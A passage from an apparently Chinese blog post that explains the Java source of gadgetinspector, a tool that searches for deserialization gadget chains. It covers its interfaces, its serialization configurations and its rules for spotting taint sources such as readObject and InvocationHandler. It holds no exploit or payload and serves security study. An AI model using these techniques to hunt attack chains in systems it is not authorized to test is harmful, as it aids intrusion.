sourceMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTaintedArgIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义<strong>污点源信息</strong>的读写格式：<code>类名 方法名 方法描述符 参数索引</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Factory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;Source&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Source <span class="title function_">parse</span><span class="params">(String[] fields)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Source</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>]),</span><br><span class="line">                Integer.parseInt(fields[<span class="number">3</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Source obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                obj.sourceMethod.getClassReference().getName(), obj.sourceMethod.getName(), obj.sourceMethod.getDesc(),</span><br><span class="line">                Integer.toString(obj.taintedArgIndex),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gadgetinspector"><a href="#gadgetinspector" class="headerlink" title="gadgetinspector"></a>gadgetinspector</h2><p>实现检测需要实现的抽象类和接口，其他类的解析放到 <strong>0x03 工作流程</strong> 一节。</p><h3 id="1-SerializableDecider"><a href="#1-SerializableDecider" class="headerlink" title="1. SerializableDecider"></a>1. SerializableDecider</h3><p>序列化决策者接口，判断类是否可序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Represents logic to decide if a class is serializable. The simple case (implemented by</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> SimpleSerializableDecider&#125;) just checks if the class implements serializable. Other use-cases may have more</span></span><br><span class="line"><span class="comment"> * complicated logic.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SerializableDecider</span> <span class="keyword">extends</span> <span class="title class_">Function</span>&lt;ClassReference.Handle, Boolean&gt; &#123; <span class="comment">// 序列化决策者</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ImplementationFinder"><a href="#2-ImplementationFinder" class="headerlink" title="2. ImplementationFinder"></a>2. ImplementationFinder</h3><p>接口，用于查找可序列化的重写方法，即判断方法所属类是否可序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ImplementationFinder</span> &#123;</span><br><span class="line">    Set&lt;MethodReference.Handle&gt; getImplementations(MethodReference.Handle target); <span class="comment">// 查找可序列化的重写方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-SourceDiscovery"><a href="#3-SourceDiscovery" class="headerlink" title="3. SourceDiscovery"></a>3. SourceDiscovery</h3><p>抽象类，实现了污点源信息的存储方法，子类需要实现污点源的具体查找方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">SourceDiscovery</span> &#123; <span class="comment">// 抽象类</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存找到的污点源</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Source&gt; discoveredSources = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加污点源</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> source 污点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">addDiscoveredSource</span><span class="params">(Source source)</span> &#123;</span><br><span class="line">        discoveredSources.add(source);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查找污点源</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 加载类信息</span></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">        <span class="comment">// 加载函数信息</span></span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        <span class="comment">// 加载继承信息</span></span><br><span class="line">        <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用实现类的 discover 方法</span></span><br><span class="line">        discover(classMap, methodMap, inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 抽象方法 -&gt; 具体实现</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap       类信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodMap      方法信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap 继承信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                                  Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                                  InheritanceMap inheritanceMap)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用工厂方法存储污点源信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">Source</span>.Factory(), discoveredSources);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gadgetinspector-x2F-config"><a href="#gadgetinspector-x2F-config" class="headerlink" title="gadgetinspector&#x2F;config"></a>gadgetinspector&#x2F;config</h2><p>定义配置。</p><h3 id="1-GIConfig"><a href="#1-GIConfig" class="headerlink" title="1. GIConfig"></a>1. GIConfig</h3><p>配置接口，所有检测实现都必须实现该接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">GIConfig</span> &#123;</span><br><span class="line">    <span class="comment">// 配置名称</span></span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化决策者</span></span><br><span class="line">    SerializableDecider <span class="title function_">getSerializableDecider</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找可序列化的重写方法</span></span><br><span class="line">    ImplementationFinder <span class="title function_">getImplementationFinder</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                                                 Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap,</span></span><br><span class="line"><span class="params">                                                 InheritanceMap inheritanceMap)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找污点源</span></span><br><span class="line">    SourceDiscovery <span class="title function_">getSourceDiscovery</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ConfigRepository"><a href="#2-ConfigRepository" class="headerlink" title="2. ConfigRepository"></a>2. ConfigRepository</h3><p>定义配置列表，用于返回配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigRepository</span> &#123;</span><br><span class="line">    <span class="comment">// 配置列表</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;GIConfig&gt; ALL_CONFIGS = Collections.unmodifiableList(Arrays.asList(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">JavaDeserializationConfig</span>(),        <span class="comment">// Java 原生序列化</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">JacksonDeserializationConfig</span>(),     <span class="comment">// Jackson（Json）</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XstreamDeserializationConfig</span>()));   <span class="comment">// XStream（XML）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回配置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name 配置名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> GIConfig <span class="title function_">getConfig</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (GIConfig config : ALL_CONFIGS) &#123;</span><br><span class="line">            <span class="keyword">if</span> (config.getName().equals(name)) &#123;</span><br><span class="line">                <span class="keyword">return</span> config;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-GIConfig-接口实现"><a href="#3-GIConfig-接口实现" class="headerlink" title="3. GIConfig 接口实现"></a>3. GIConfig 接口实现</h3><p>JavaDeserializationConfig</p><ul><li>配置名称：<code>jserial</code></li><li>序列化决策者：gadgetinspector&#x2F;javaserial&#x2F;SimpleSerializableDecider</li><li>查找可序列化的重写方法：gadgetinspector&#x2F;javaserial&#x2F;SimpleImplementationFinder</li><li>查找污点源：gadgetinspector&#x2F;javaserial&#x2F;SimpleSourceDiscovery</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaDeserializationConfig</span> <span class="keyword">implements</span> <span class="title class_">GIConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;jserial&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> SerializableDecider <span class="title function_">getSerializableDecider</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleSerializableDecider</span>(inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ImplementationFinder <span class="title function_">getImplementationFinder</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                                                        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap,</span></span><br><span class="line"><span class="params">                                                        InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleImplementationFinder</span>(getSerializableDecider(methodMap, inheritanceMap), methodImplMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> SourceDiscovery <span class="title function_">getSourceDiscovery</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleSourceDiscovery</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JacksonDeserializationConfig</p><ul><li>配置名称：<code>jackson</code></li><li>序列化决策者：gadgetinspector&#x2F;jackson&#x2F;JacksonSerializableDecider</li><li>查找可序列化的重写方法：gadgetinspector&#x2F;jackson&#x2F;JacksonImplementationFinder</li><li>查找污点源：gadgetinspector&#x2F;jackson&#x2F;JacksonSourceDiscovery</li></ul><p>XstreamDeserializationConfig</p><ul><li>配置名称：<code>xstream</code></li><li>序列化决策者：gadgetinspector&#x2F;xstream&#x2F;XstreamSerializableDecider、gadgetinspector&#x2F;xstream&#x2F;CustomXstreamSerializableDecider</li><li>查找可序列化的重写方法：gadgetinspector&#x2F;javaserial&#x2F;SimpleImplementationFinder</li><li>查找污点源：gadgetinspector&#x2F;javaserial&#x2F;SimpleSourceDiscovery</li></ul><h2 id="gadgetinspector-x2F-javaserial"><a href="#gadgetinspector-x2F-javaserial" class="headerlink" title="gadgetinspector&#x2F;javaserial"></a>gadgetinspector&#x2F;javaserial</h2><p>针对 Java 原生序列化的反序列化利用链检测实现。</p><h3 id="1-SimpleSerializableDecider"><a href="#1-SimpleSerializableDecider" class="headerlink" title="1. SimpleSerializableDecider"></a>1. SimpleSerializableDecider</h3><p>实现 <code>SerializableDecider</code> 接口，判断类是否可序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleSerializableDecider</span> <span class="keyword">implements</span> <span class="title class_">SerializableDecider</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Boolean&gt; cache = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  <span class="comment">// 缓存判断结果，类-&gt;是否可序列化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;    <span class="comment">// 继承信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleSerializableDecider</span><span class="params">(InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断类是否可以序列化，并将判断结果添加到缓存</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handle 类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">apply</span><span class="params">(ClassReference.Handle handle)</span> &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">cached</span> <span class="operator">=</span> cache.get(handle);</span><br><span class="line">        <span class="keyword">if</span> (cached != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cached;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">result</span> <span class="operator">=</span> applyNoCache(handle);</span><br><span class="line"></span><br><span class="line">        cache.put(handle, result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断类是否可以序列化</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handle 类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Boolean <span class="title function_">applyNoCache</span><span class="params">(ClassReference.Handle handle)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断类是否在黑名单内</span></span><br><span class="line">        <span class="keyword">if</span> (isBlacklistedClass(handle)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否有直接或间接实现 java/io/Serializable 序列化接口</span></span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(handle, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/io/Serializable&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断类是否在黑名单内</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz 类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isBlacklistedClass</span><span class="params">(ClassReference.Handle clazz)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getName().startsWith(<span class="string">&quot;com/google/common/collect/&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Serialization of these classes has been disabled since clojure 1.9.0</span></span><br><span class="line">        <span class="comment">// https://github.com/clojure/clojure/commit/271674c9b484d798484d134a5ac40a6df15d3ac3</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.getName().equals(<span class="string">&quot;clojure/core/proxy$clojure/lang/APersistentMap$ff19274a&quot;</span>)</span><br><span class="line">                || clazz.getName().equals(<span class="string">&quot;clojure/inspector/proxy$javax/swing/table/AbstractTableModel$ff19274a&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-SimpleImplementationFinder"><a href="#2-SimpleImplementationFinder" class="headerlink" title="2. SimpleImplementationFinder"></a>2. SimpleImplementationFinder</h3><p>实现 <code>ImplementationFinder</code> 接口，返回目标方法的可序列化重写方法（包括目标方法本身）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleImplementationFinder</span> <span class="keyword">implements</span> <span class="title class_">ImplementationFinder</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;  <span class="comment">// 序列化决策者</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap;   <span class="comment">// 重写方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleImplementationFinder</span><span class="params">(SerializableDecider serializableDecider, Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">        <span class="built_in">this</span>.methodImplMap = methodImplMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;MethodReference.Handle&gt; getImplementations(MethodReference.Handle target) &#123;</span><br><span class="line">        <span class="comment">// 存储可序列化的重写方法</span></span><br><span class="line">        Set&lt;MethodReference.Handle&gt; allImpls = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Assume that the target method is always available, even if not serializable; the target may just be a local</span></span><br><span class="line">        <span class="comment">// instance rather than something an attacker can control.</span></span><br><span class="line">        allImpls.add(target);   <span class="comment">// 默认认为目标方法可序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历重写方法</span></span><br><span class="line">        Set&lt;MethodReference.Handle&gt; subClassImpls = methodImplMap.get(target);</span><br><span class="line">        <span class="keyword">if</span> (subClassImpls != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (MethodReference.Handle subClassImpl : subClassImpls) &#123;</span><br><span class="line">                <span class="comment">// 判断是否可序列化</span></span><br><span class="line">                <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(subClassImpl.getClassReference()))) &#123;</span><br><span class="line">                    allImpls.add(subClassImpl); <span class="comment">// 添加到 allImpls</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> allImpls;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-SimpleSourceDiscovery"><a href="#3-SimpleSourceDiscovery" class="headerlink" title="3. SimpleSourceDiscovery"></a>3. SimpleSourceDiscovery</h3><p>继承 <code>SourceDiscovery</code> 抽象类，实现具体的污点源查找方法 <code>discover</code>。遍历类信息和方法信息，根据定义的 5 条规则搜索污点源：</p><ul><li>方法所属类可以序列化，且方法为无参数 void 类型的 finalize 方法</li><li>方法所属类可以序列化，且方法为接受 ObjectInputStream 类型参数的 void 类型的 readObject 方法</li><li>类可以序列化，且为 InvocationHandler 的子类</li><li>方法所属类可以序列化，且方法为无参数 int 类型的 hashCode 方法或接受 Object 类型参数的 boolean 类型的 equals 方法</li><li>方法所属类可以序列化，且该类为 groovy Closure 的子类、方法为 call 或 doCall</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 